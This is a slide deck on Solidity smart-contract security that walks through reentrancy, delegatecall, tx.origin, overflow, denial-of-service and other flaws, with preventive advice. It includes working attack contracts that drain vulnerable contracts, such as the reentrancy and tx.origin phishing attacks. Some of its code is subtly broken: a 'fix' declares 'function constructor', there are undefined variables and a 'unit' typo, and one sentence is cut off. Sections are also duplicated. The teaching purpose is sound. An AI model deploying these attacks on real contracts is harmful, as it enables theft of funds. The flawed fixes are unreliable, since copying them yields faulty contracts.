---
marp: true
theme: gaia
class:
  - lead
---
# Security is one of the most important considerations when writing smart contracts

As with other programs, a smart contract will execute exactly what is written, which
is not always what the programmer intended. Furthermore, all smart contracts are
public, and any user can interact with them simply by creating a transaction. Any vulnerability
can be exploited, and losses are almost always impossible to recover. It is
therefore critical to follow best practices and use well-tested design patterns.



## Security Best Practices

**Defensive programming**

- Minimalism/simplicity

  Complexity is the enemy of security. The simpler the code, and the less it does,
  the lower the chances are of a bug or unforeseen effect occurring

  

- Code reuse

  Try not to reinvent the wheel. If a library or contract already exists that does most
  of what you need, reuse it. Within your own code, follow the DRY principle:
  Don’t Repeat Yourself

  

- Code quality

  Smart contract code is unforgiving. Every bug can lead to monetary loss

  

- Readability/auditability

  Your code should be clear and easy to comprehend

  

- Test coverage

  Test everything that you can.



## Security Risks and Antipatterns

### Reentrancy

Attacks of this kind were used in the infamous [DAO](https://en.wikipedia.org/wiki/The_DAO_(organization)) hack.



```javascript
1 contract EtherStore {
2
3 	uint256 public withdrawalLimit = 1 ether;
4 	mapping(address => uint256) public lastWithdrawTime;
5 	mapping(address => uint256) public balances;
6   //存款
7 	function depositFunds() public payable {
8 		balances[msg.sender] += msg.value;
9 	}
10  //取款
11 	function withdrawFunds (uint256 _weiToWithdraw) public {
12 		require(balances[msg.sender] >= _weiToWithdraw);
13 		// limit the withdrawal
14 		require(_weiToWithdraw <= withdrawalLimit);
15 		// limit the time allowed to withdraw
16 		require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
17 		require(msg.sender.call.value(_weiToWithdraw)()); //the vulnerability
18 		balances[msg.sender] -= _weiToWithdraw;
19 		lastWithdrawTime[msg.sender] = now;
20 	}
21 }
```



Consider an attacker who has created the contract :

```javascript
1 import "EtherStore.sol";
2
3 contract Attack {
4 	EtherStore public etherStore;
5
6 	// intialize the etherStore variable with the contract address
7 	constructor(address _etherStoreAddress) {
8 		etherStore = EtherStore(_etherStoreAddress);
9 	}
10
11 	function attackEtherStore() public payable {
12 		// attack to the nearest ether
13 		require(msg.value >= 1 ether);
14 		// send eth to the depositFunds() function
15 		etherStore.depositFunds.value(1 ether)();
16 		// start the magic
17 		etherStore.withdrawFunds(1 ether);
18 	}
19
20 	function collectEther() public {
21 		msg.sender.transfer(this.balance);
22 	}
23
24 	// fallback function - where the magic happens
25 	function () payable {
26 		if (etherStore.balance > 1 ether) {
27 			etherStore.withdrawFunds(1 ether);
28 		}
29 	}
30 }
```



#### Preventative Techniques

1. use transfer function when sending ether to external contracts, only sends 2300 gas with the external call
2. ensure that all logic that changes state variables happens before ether is sent out of the contract (or any external call).
3. introduce a mutex—that is, to add a state variable that locks the contract during code execution, preventing reentrant calls.



### Arithmetic Over/Underflows

```javascript
1 contract TimeLock {
2
3	mapping(address => uint) public balances;
4 	mapping(address => uint) public lockTime;
5
6 	function deposit() public payable {
7 		balances[msg.sender] += msg.value;
8 		lockTime[msg.sender] = now + 1 weeks;
9 	}
10
11 	function increaseLockTime(uint _secondsToIncrease) public {
12 		lockTime[msg.sender] += _secondsToIncrease;
13 	}
14
15 	function withdraw() public {
16 		require(balances[msg.sender] > 0);
17 		require(now > lockTime[msg.sender]);
18 		balances[msg.sender] = 0;
19 		msg.sender.transfer(balance);
20 	}
21 }
```



### DELEGATECALL

```javascript
1 // library contract - calculates Fibonacci-like numbers
2 contract FibonacciLib {
3 	// initializing the standard Fibonacci sequence
4 	uint public start;
5 	uint public calculatedFibNumber;
6
7 	// modify the zeroth number in the sequence
8 	function setStart(uint _start) public {
9 		start = _start;
10 	}
11
12 	function setFibonacci(uint n) public {
13 		calculatedFibNumber = fibonacci(n);
14 	}
15
16 	function fibonacci(uint n) internal returns (uint) {
17 		if (n == 0) return start;
18 		else if (n == 1) return start + 1;
19 		else return fibonacci(n - 1) + fibonacci(n - 2);
20 	}
21 }
```



```javascript
1 contract FibonacciBalance {
2
3 	address public fibonacciLibrary;
4 	// the current Fibonacci number to withdraw
5 	uint public calculatedFibNumber;
6 	// the starting Fibonacci sequence number
7 	uint public start = 3;
8 	uint public withdrawalCounter;
9 	// the Fibonancci function selector
10 	bytes4 constant fibSig = bytes4(sha3("setFibonacci(uint256)"));
11
12 	// constructor - loads the contract with ether
13 	constructor(address _fibonacciLibrary) public payable {
14 		fibonacciLibrary = _fibonacciLibrary;
15 	}
16
17 function withdraw() {
18 		withdrawalCounter += 1;
19 		// calculate the Fibonacci number for the current withdrawal user-
20 		// this sets calculatedFibNumber
21 		require(fibonacciLibrary.delegatecall(fibSig, withdrawalCounter));
22 		msg.sender.transfer(calculatedFibNumber * 1 ether);
23 	}
24
25 	// allow users to call Fibonacci library functions
26 	function() public {
27 		require(fibonacciLibrary.delegatecall(msg.data));
28 	}
29 }
```



```javascript
1 contract Attack {
2 	uint storageSlot0; // corresponds to fibonacciLibrary
3 	uint storageSlot1; // corresponds to calculatedFibNumber
4
5 	// fallback - this will run if a specified function is not found
6 	function() public {
7 		storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw
8 		// is called we don't send out any ether
9 		<attacker_address>.transfer(this.balance); // we take all the ether
10 	}
11 }
```



#### Preventative Techniques

Solidity provides the library keyword for implementing library contracts (see the
docs for further details). This ensures the library contract is stateless and non-selfdestructable.
Forcing libraries to be stateless mitigates the complexities of storage
context demonstrated in this section. Stateless libraries also prevent attacks wherein
attackers modify the state of the library directly in order to affect the contracts that
depend on the library’s code. As a general rule of thumb, when using DELEGATECALL
pay careful attention to the possible calling context of both the library contract and
the calling contract, and whenever possible build stateless libraries.



### Default Visibilities

The default visibility for functions is public, so functions that do not specify their
visibility will be callable by external users. The issue arises when developers mistakenly
omit visibility specifiers on functions that should be private (or only callable
within the contract itself).



```javascript
1 contract HashForEther {
2
3 function withdrawWinnings() {
4 	// Winner if the last 8 hex characters of the address are 0
5 	require(uint32(msg.sender) == 0);
6 	_sendWinnings();
7 }
8
9 	function _sendWinnings() { // any contract should call to steal the balance
10 		msg.sender.transfer(this.balance);
11 	}
12 }
```



***Real-World Example: Parity Multisig Wallet (First Hack)***



### Short Address/Parameter Attack

When passing parameters to a smart contract, the parameters are encoded according
to the ABI specification. It is possible to send encoded parameters that are shorter
than the expected parameter length (for example, sending an address that is only 38
hex chars (19 bytes) instead of the standard 40 hex chars (20 bytes)). In such a scenario,
the EVM will add zeros to the end of the encoded parameters to make up the
expected length.

This becomes an issue when third-party applications do not validate inputs. The
clearest example is an exchange that doesn’t verify the address of an ERC20 token
when a user requests a withdrawal. This example is covered in more detail in Peter
Vessenes’s post, “[The ERC20 Short Address Attack Explained](https://vessenes.com/the-erc20-short-address-attack-explained/)”.
Consider the standard ERC20 transfer function interface, noting the order of the
parameters:



```javascript
function transfer(address to, uint tokens) public returns (bool success);
```



Wanted: address: 0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddead

token: 56bc75e2d63100000 (100)

```
a9059cbb000000000000000000000000deaddeaddea \
ddeaddeaddeaddeaddeaddeaddead0000000000000
000000000000000000000000000000000056bc75e2d63100000
```

but:

```
a9059cbb000000000000000000000000deaddeaddea \
ddeaddeaddeaddeaddeaddeadde00000000000000
00000000000000000000000000000000056bc75e2d6310000000
```

address: 0xdeaddeaddeaddeaddeaddeaddeaddeaddeadde00

token: 56bc75e2d6310000000 (25600)



#### Preventative Techniques

All input parameters in external applications should be validated before sending them
to the blockchain. It should also be noted that parameter ordering plays an important
role here. As padding only occurs at the end, careful ordering of parameters in the
smart contract can mitigate some forms of this attack



#### Unchecked CALL Return Values

```javascript
1 contract Lotto {
2
3 	bool public payedOut = false;
4 	address public winner;
5 	uint public winAmount;
6
7 	// ... extra functionality here
8
9 	function sendToWinner() public {
10 		require(!payedOut);
11 		winner.send(winAmount);
12 		payedOut = true;
13 	}
14
15 	function withdrawLeftOver() public {
16 		require(payedOut);
17 		msg.sender.send(this.balance);
18 	}
19 }
```



In this trivial example, a winner whose transaction fails (either by running
out of gas or by being a contract that intentionally throws in the fallback function)

#### Preventative Techniques

Whenever possible, use the transfer function rather than send, as transfer will
revert if the external transaction reverts. If send is required, always check the return
value.



### Block Timestamp Manipulation

```
contract Roulette {
    uint public pastBlockTime; // forces one bet per block 

    constructor() public payable {} // initially fund contract

    // fallback function used to make a bet
    function () public payable {
        require(msg.value == 10 ether); // must send 10 ether to play
        require(now != pastBlockTime);  // only 1 transaction per block
        pastBlockTime = now;
        if(now % 15 == 0) { // winner
            msg.sender.transfer(this.balance);
        } 
    }
}
```
---
#### Preventative Techniques

It is sometimes recommended to use `block.number` and an average block time to estimate times; with a `10 second block time`, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable easily to manipulate the block number.



### Race Conditions/Front Running

```
1 contract FindThisHash {
2 	bytes32 constant public hash =
3 		0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a;
4
5 	constructor() public payable {} // load with ether
6
7 	function solve(string solution) public {
8 	// If you can find the pre-image of the hash, receive 1000 ether
9 		require(hash == sha3(solution));
10 		msg.sender.transfer(1000 ether);
11 	}
12 }
```



### Denial of Service (DoS)

This category is very broad, but fundamentally consists of attacks where users can render a contract inoperable for a period of time, or in some cases permanently. This can trap ether in these contracts forever,



- Looping through externally manipulated mappings or arrays



```javascript
1 contract DistributeTokens {
2 	address public owner; // gets set somewhere
3 	address[] investors; // array of investors
4 	uint[] investorTokens; // the amount of tokens each investor gets
5
6 	// ... extra functionality, including transfertoken()
7
8 	function invest() public payable {
9 		investors.push(msg.sender);
10 		investorTokens.push(msg.value * 5); // 5 times the wei sent
11 	}
12
13 	function distribute() public {
14 		require(msg.sender == owner); // only owner
15 		for(uint i = 0; i < investors.length; i++) {
16 			// here transferToken(to,amount) transfers "amount" of
17 			// tokens to the address "to"
18 			transferToken(investors[i],investorTokens[i]);
19 		}
20 	}
21 }
```



- Owner operations

In such cases, if the privileged user loses their private keys or becomes inactive,
the entire token contract becomes inoperable. In this case, if the owner cannot
call finalize no tokens can be transferred; the entire operation of the token ecosystem
hinges on a single address



```
1 	bool public isFinalized = false;
2 	address public owner; // gets set somewhere
3
4 	function finalize() public {
5 		require(msg.sender == owner);
6 		isFinalized == true;
7 	}
8
9 	// ... extra ICO functionality
10
11 	// overloaded transfer function
12 	function transfer(address _to, uint _value) returns (bool) {
13 		require(isFinalized);
14 		super.transfer(_to,_value)
15 	}
16
17 ...
```



- Progressing state based on external calls
  Contracts are sometimes written such that progressing to a new state requires
  sending ether to an address, or waiting for some input from an external source.
  These patterns can lead to DoS attacks when the external call fails or is prevented
  for external reasons. In the example of sending ether, a user can create a contract
  that does not accept ether. If a contract requires ether to be withdrawn in order to
  progress to a new state (consider a time-locking contract that requires all ether to
  be withdrawn before being usable again), the contract will never achieve the new
  state, as ether can never be sent to the user’s contract that does not accept ether.

  

#### Preventative Techniques

In the first example, contracts should not loop through data structures that can be
artificially manipulated by external users. A withdrawal pattern is recommended,
whereby each of the investors call a withdraw function to claim tokens independently.

In the second example, a privileged user was required to change the state of the contract.
In such examples a failsafe can be used in the event that the owner becomes
incapacitated. One solution is to make the owner a multisig contract. Another solution
is to use a time-lock: in the example given the require on line 13 could include a
time-based mechanism, such as require(msg.sender == owner || now > unlock
Time), that allows any user to finalize after a period of time specified by unlockTime.

This kind of mitigation technique can be used in the third example also. If external
calls are required to progress to a new state, account for their possible failure and
potentially add a time-based state progression in the event that the desired call never
comes.
Of

### Unexpected Ether
```
contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;

    mapping(address => uint) redeemableEther;
    // Users pay 0.5 ether. At specific milestones, credit their accounts.
    function play() external payable {
        require(msg.value == 0.5 ether); // each play is 0.5 ether
        uint currentBalance = this.balance + msg.value; // this.balance can be changed in anexpected way.
        // ensure no players after the game has finished
        require(currentBalance <= finalMileStone);
        // if at a milestone, credit the player's account
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(this.balance == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0);
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }
```

---
#### Preventative Techniques
```
contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;
    uint public depositedWei;

    mapping (address => uint) redeemableEther;

    function play() external payable {
        require(msg.value == 0.5 ether);
        uint currentBalance = depositedWei + msg.value;
        // ensure no players after the game has finished
        require(currentBalance <= finalMileStone);
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        depositedWei += msg.value;
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(depositedWei == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0);
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }
```
---

### Block Timestamp Manipulation

```
contract Roulette {
    uint public pastBlockTime; // forces one bet per block 

    constructor() public payable {} // initially fund contract

    // fallback function used to make a bet
    function () public payable {
        require(msg.value == 10 ether); // must send 10 ether to play
        require(now != pastBlockTime);  // only 1 transaction per block
        pastBlockTime = now;
        if(now % 15 == 0) { // winner
            msg.sender.transfer(this.balance);
        } 
    }
}
```
---
#### Preventative Techniques

It is sometimes recommended to use `block.number` and an average block time to estimate times; with a `10 second block time`, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable easily to manipulate the block number.

---
#### Block Timestamp Manipulation in depth
```go
// miner/worker.go Line-834 
if parent.Time() >= uint64(timestamp) {
    timestamp = int64(parent.Time() + 1)
}
// this will ensure we're not going off too far in the future
if now := time.Now().Unix(); timestamp > now+1 {
    wait := time.Duration(timestamp-now) * time.Second
    log.Info("Mining too far in the future", "wait", common.PrettyDuration(wait))
    time.Sleep(wait)
}
```
[timestamp setup in go-etheurem](https://github.com/ethereum/go-ethereum/blob/b9df7ecdc3d3685180ceb29665bab59e9f614da5/miner/worker.go#L834)

---
# History of Ethereum Security Vulnerabilities, Hacks and Their Fixs

https://applicature.com/blog/blockchain-technology/history-of-ethereum-security-vulnerabilities-hacks-and-their-fixes

---
# Constructors with Care

```javascript
contract OwnerWallet {
    address public owner; 
    // constructor's name doest match the name of the contract.
    function ownerWallet(address _owner) public {
        owner = _owner;
    }

    // Fallback. Collect ether
    function() payable {}

    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(this.balance);
    }
 }
```
---
# Preventative Techniques

A new keyword `constructor` that specifies the constructor. 
```javascript
pragma solidity >=0.4.22;

contract OwnerWallet {
    address public owner; 
 
    function constructor(address _owner) public {
        owner = _owner;
    }
 }
```
---
# Uninitialized Storage Pointers
```javascript 
// NameRegistrar.sol, A locked name registrar
contract NameRegistrar {
    bool public unlocked = false; // registrar locked, no name updates
    struct NameRecord {// map hashes to addresses 
        bytes32 name;
        address mappedAddress;
    }
    // records who registered names
    mapping(address => NameRecord) public registeredNameRecord;
    // resolves hashes to addresses
    mapping(bytes32 => address) public resolve;

    function register(bytes32 _name, address _mappedAddress) public {
        NameRecord newRecord;
        newRecord.name = _name;
        newRecord.mappedAddress = _mappedAddress;
        resolve[_name] = _mappedAddress; 
        registeredNameRecord[msg.sender] = newRecord;
        require(unlocked); // only allow registrations if contract is unlocked
    }
 }
```
存储模式??

---
# Preventative Techniques
The Solidity compiler shows **a warning** for unintialized storage variables; developers should pay careful attention to these warnings when building smart contracts. The current version of Mist (0.10) doesn’t allow these contracts to be compiled. It is often good practice to explicitly use the memory or storage specifiers when dealing with complex types, to ensure they behave as expected.

---
# Floating Point and Precision
```javascript
contract FunWithNumbers {
    unit constant public tokensPerEth = 10;
    uint constant public weiPerEth = 1e18;
    mapping(address => uint) public balances;

    function buyTokens() public payable {
        // convert wei to eth, then multiply by token rate
        // less than 1 ether results in 0;
        uint tokens = msg.value/weiPerEth*tokensPerEth;
        balances[msg.sender] += tokens;
    }

    function sellTokens(uint tokens) public {
        require(balances[msg.sender] >= tokens);
        uint eth = tokens/tokensPerEth; // less than 1 ether results in 0
        balances[msg.sender] -= tokens;
        msg.sender.transfer(eth*weiPerEth);
    }
}

```

---
# Preventative Techniques
1. larger numrator: `msg.value/weiPerTokens`, i.e. `weiPerTokens=1e17`
2. performed the multiplication first and then the division: `msg.value*tokenPerEth/weiPerEth`
3.   higher precision in mathematical operations, then convert back down to the precision required for output. [ds-math](https://github.com/dapphub/ds-math)
```javascript 
uint constant WAD = 10 ** 18;
// wmul function
z = add(mul(x, y), WAD / 2) / WAD; // rounds to zero if x*y < WAD / 2

wmul(1.1 ether, 2.2 ether) == 2.42 ether
```

---
# Tx.Origin Authentication
```javascript
// Phishable.sol
contract Phishable {
    address public owner;

    constructor (address _owner) {
        owner = _owner;
    }

    function () public payable {} // collect ether

    function withdrawAll(address _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(this.balance);
    }
}
```

---
# Tx.Origin Attack
```javascript
import "Phishable.sol"
contract AttackContract {
    Phishable phishableContract;
    address attacker; // The attacker's address to receive funds

    constructor (Phishable _phishableContract, address _attackerAddress) {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    function () payable {
        phishableContract.withdrawAll(attacker);
    }
}
```

---
# Preventative Techniques

tx.origin should not be used for authorization in smart contracts.

For example, if one wanted to deny external contracts from calling the current contract, one could implement a require of the form `require(tx.origin == msg.sender)`. This prevents intermediate contracts being used to call the current contract, limiting the contract to regular codeless addresses.

---
# Contract Libraries

openzeppelin off-chain libraries: https://openzeppelin.com/contracts/

openzeppelin on-chain libraries: https://openzeppelin.com/sdk/

---
# Preventative Techniques
In cryptography, this is so important it has been condensed into an adage: **“Don’t roll your own crypto.”** In the case of smart contracts, this amounts to gaining as much as possible from freely available libraries that have been thoroughly vetted by the community.
